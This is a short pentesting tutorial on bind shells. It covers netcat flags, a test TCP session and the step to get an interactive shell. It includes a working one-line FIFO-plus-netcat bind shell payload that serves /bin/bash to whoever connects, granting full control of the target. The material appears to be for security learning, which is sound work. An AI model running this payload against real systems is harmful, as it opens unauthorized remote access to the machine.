# Bind Shells

A **bind shell** is established when a **target system starts a listener** and waits for an incoming connection from the attack box. This technique allows a pentester to control a remote system through its terminal.

### Netcat (nc) Command Reference

Netcat is a versatile tool capable of handling TCP, UDP, and Unix sockets across IPv4 and IPv6.

|Parameter|Description|
|:--|:--|
|`-l`|**Listen** mode, for inbound connects|
|`-v`|**Verbose** output|
|`-n`|Suppress **DNS resolution**|
|`-p`|Specify the **port** number|

---

### Workflow: Establishing a Basic TCP Session

Use this workflow to verify connectivity and text communication between systems before attempting a full shell.

1. **Start the listener on the target:**
    
    ```
    nc -lvnp <PORT>
    ```
    
2. **Connect from the attack box:**
    
    ```
    nc -nv <TARGET_IP> <PORT>
    ```
    
3. **Verify connectivity:** Type a message on the attack box; if successful, the text will appear in the target's terminal. Note that this is a **TCP session only** and does not allow OS or file system interaction.

---

### Workflow: Establishing a Functional Bind Shell

Use this method when you need **interactive OS access**. This requires serving a shell (e.g., Bash) through the Netcat session using redirection and pipelines.

1. **Execute the bind shell payload on the target:** This payload creates a **FIFO named pipe** to redirect input and output between the shell and Netcat.
    
    ```
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <TARGET_IP> <PORT> > /tmp/f
    ```
    
2. **Connect to the listener from the attack box:**
    
    ```
    nc -nv <TARGET_IP> <PORT>
    ```
    
3. **Interact with the shell:** Upon a successful connection, the attack box will receive a prompt (e.g., `Target@server:~$`), granting **complete control** over the target system.

---

### Operational Considerations & Limitations

- **Firewall Interference:** Bind shells are **easier to defend against** because they rely on an **incoming connection** to the target. OS firewalls often block unsolicited traffic on non-standard ports.
- **Technique Selection:** If inbound connections to the target are restricted by firewalls, IDS, or IPS, a bind shell will likely fail, requiring a **reverse shell** instead.
- **Payload Variability:** Command syntax for serving a shell will differ depending on the **host operating system** (e.g., Linux vs. Windows).